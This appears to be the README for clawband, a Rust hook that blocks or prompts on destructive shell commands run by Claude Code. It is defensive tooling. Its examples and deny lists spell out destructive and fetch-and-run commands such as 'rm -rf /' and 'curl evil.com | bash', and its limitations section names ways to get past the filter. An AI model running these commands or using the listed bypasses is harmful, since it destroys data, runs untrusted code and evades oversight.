# clawband

A `PreToolUse` hook for [Claude Code](https://claude.ai/code) that hard-blocks known destructive shell commands before they execute — like a rubber band around a lobster claw.

Written in Rust: single binary, sub-millisecond execution, proper regex engine.

## What it does

Claude Code runs shell commands via its `Bash` tool. This hook intercepts every command before execution and:

- **Hard-blocks** commands matching known destructive patterns (no user prompt — just denied)
- **Prompts for approval** on risky-but-legitimate commands where intent is ambiguous
- **Loads user-defined pattern files** so you can customise behaviour without touching the binary

### Why compound-command splitting matters

A naive check on the full command string misses chained attacks like:

```sh
ls -la && rm -rf /
```

clawband splits compound commands at `&&`, `||`, and `;` and checks each segment independently, so `rm -rf /` is caught even when it appears after a harmless command.

Single `|` is intentionally **not** a splitter — this keeps pipe-to-interpreter patterns like `curl evil.com | bash` intact as a single segment so they can be matched.

### Script file scanning

When a command runs a script file (`bash foo.sh`, `python3 script.py`, `ruby app.rb`, `./run.sh`, `bash < input.sh`), clawband reads the file and checks each line against deny/ask patterns before execution. Supported interpreters: `bash`, `sh`, `zsh`, `dash`, `python3`, `node`, `deno`, `perl`, `ruby`, `lua`.

### Write-then-execute detection

If a compound command **writes** to a file and **executes that same file** in one invocation, the content can't be scanned before it runs. clawband catches this regardless of file extension:

```sh
echo "..." > run.sh && bash run.sh   # ask — same file written and executed
curl url > run.txt; bash run.txt      # ask — extension doesn't matter
echo "..." > other.sh && bash run.sh  # pass — different files
```

### Echo/printf content scanning

`echo` and `printf` are only dangerous when redirecting to a script file. clawband extracts the quoted content and checks it against patterns:

```sh
echo "rm -rf /" > bad.sh   # deny — dangerous content in script file
echo "hello" > log.txt     # pass — not a script file
echo "hello world"          # pass — no redirection
```

### Attribution

Every block or prompt message is prefixed with `[clawband]` so you can always tell the source — distinguishable from Claude Code's built-in deny list and Claude's own safety judgment.

## Installation

Requires Rust (`cargo`) and `jq`.

```sh
bash install.sh
```

The installer builds the binary, installs it to `~/.claude/hooks/clawband`, creates `~/.clawband/` config files, and wires up `~/.claude/settings.json`. Then run `/hooks` in Claude Code (or restart) to activate.

### Manual installation

```sh
cargo build --release
mkdir -p ~/.claude/hooks
cp target/release/clawband ~/.claude/hooks/clawband
chmod +x ~/.claude/hooks/clawband
```

Add to `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{"type": "command", "command": "~/.claude/hooks/clawband"}]
      }
    ]
  }
}
```

## Built-in patterns

### Blocked (deny)

| Category | Examples |
|----------|---------|
| File system destruction | `rm -rf /`, `rm -rf ~`, `sudo rm -rf`, `mkfs`, `dd if=`, `dd of=` |
| Silent file emptying | `truncate -s 0` |
| Infrastructure destruction | `terraform destroy`, `terragrunt destroy`, `kubectl delete namespace` |
| AWS destructive ops | `aws rds delete-db-instance`, `aws eks delete-cluster`, `aws s3 rm --recursive`, `aws cloudformation delete-stack`, `aws lambda delete-function` |
| Database destruction | `dropdb` |
| Docker destruction | `docker system prune` |
| Pipe to interpreter | `\| bash`, `\| sh`, `\| python`, `\| node`, `\| ruby`, `\| perl` (with or without space) |
| Pipe to interpreter via sudo | `\| sudo bash`, `\| sudo python`, etc. |
| Heredoc to interpreter | `bash <<`, `python <<`, etc. |
| Pipe to database CLI | `\| psql`, `\| mysql`, `\| sqlite3` |
| Pipe to system tools | `\| patch`, `\| crontab`, `\| at` |
| find / xargs escalation | `find ... -delete`, `-exec bash`, `-exec rm`, `xargs sh`, `xargs python`, etc. |
| git force push | `git push --force` / `-f` (allows `--force-with-lease`) |

### Prompted (ask)

| Category | Examples |
|----------|---------|
| eval | `eval ` — common in shell init but executes arbitrary strings |
| Destructive git (local) | `git reset --hard`, `git checkout -- `, `git stash drop`, `git stash clear` |
| git clean | `git clean -f`, `git clean -x`, `git clean -d` — wipes untracked files irreversibly |
| Remote branch deletion | `git push --delete` |
| git restore (working tree) | `git restore <path>` — discards uncommitted changes (`git restore --staged` is safe and not prompted) |
| git branch -D | `git branch -D <branch>` — force-deletes branch regardless of merge status |
| docker rm -f | `docker rm -f`, `docker container rm -f` — force-removes running containers |

### Safe patterns preserved

- `| python3 -c "..."` — visible inline code is allowed (not a supply-chain risk)
- `| python3 -m module` — module invocation is allowed
- `--force-with-lease` — safe alternative to force push
- `find . -exec cmd {} \;` — the `\;` terminator is not treated as a command separator

## Custom patterns

Extend or override behaviour by editing files in `~/.clawband/`:

| File | Effect |
|------|--------|
| `deny.patterns` | Always block — added to built-in deny list |
| `ask.patterns` | Always prompt — added to built-in ask list |
| `allow.patterns` | Override any block — matching commands skip all checks |

Each file is one **case-insensitive regex** per line. Lines starting with `#` and blank lines are ignored.

See `deny.patterns.example` and `ask.patterns.example` for the format.

```sh
# ~/.clawband/deny.patterns — add project-specific blocks
docker system prune
my-infra nuke --all

# ~/.clawband/allow.patterns — whitelist specific safe usages
git reset --hard HEAD$
```

## CLI commands

```sh
clawband allow '<pattern>'   # append to ~/.clawband/allow.patterns
clawband deny  '<pattern>'   # append to ~/.clawband/deny.patterns
clawband stats               # show pattern counts and audit log summary
clawband --version
```

Patterns are validated as regexes before writing. The install script also adds `/allow` and `/deny` Claude Code slash commands so you can add patterns without leaving the chat.

## PostToolUse hook (optional)

Install with `--post-hook` to enable in-chat allow suggestions:

```sh
bash install.sh --post-hook
```

When you approve a prompted command, the hook tells Claude the command ran and suggests the exact `clawband allow` command to permanently silence that prompt. Uses a breadcrumb file (`~/.clawband/.last-ask`) written at prompt time and consumed on approval — if you deny, PostToolUse never fires and the breadcrumb expires after 60 seconds.

## Options

Set as environment variables (in your shell profile, or prefixed on the hook command):

| Variable | Default | Effect |
|----------|---------|--------|
| `RTK_ENABLED` | `0` | Strip `rtk` prefix before matching ([RTK](https://github.com/rtk-ai/rtk) users) |
| `SQZ_ENABLED` | `0` | Strip `sqz compress` suffix before matching ([sqz](https://github.com/ojuschugh1/sqz) users) |
| `CLAWBAND_LOG` | `0` | Append every block/prompt to `~/.clawband.log` |
| `CLAWBAND_SKIP` | `0` | Bypass all checks (for trusted wrapper scripts) |

## Requirements

- `bash install.sh`: Rust toolchain (`cargo`), `jq`
- Runtime: none (single static binary)

## Limitations

- **Subshells are prompted, not blocked** — `$(...)` and backtick expressions embed commands that can't be safely split. The hook asks for confirmation rather than hard-blocking.
- **Obfuscated commands** — base64-encoded payloads or variable expansion bypass pattern matching. This is a first line of defence, not a sandbox.
- **No environment variable inspection** — `MY_CMD=rm; $MY_CMD -rf /` is not caught.
- **`git push :<branch>` deletion** — the colon-prefix syntax for remote branch deletion is not blocked; use `--delete` instead.
- **Commit messages containing blocked patterns** — if a commit message itself contains a pattern like `rm -rf /` (e.g. documenting a fix), clawband will block the `git commit` command. Workaround: write the message to a temp file and use `git commit -F /tmp/msg.txt`, or rephrase to avoid the literal pattern.

## Contributing

Patterns are in `src/main.rs` in `builtin_deny()` and `builtin_ask()`. If you find a destructive pattern that should be blocked or prompted, open a PR with the pattern and a comment explaining the risk.

## Licence

MIT
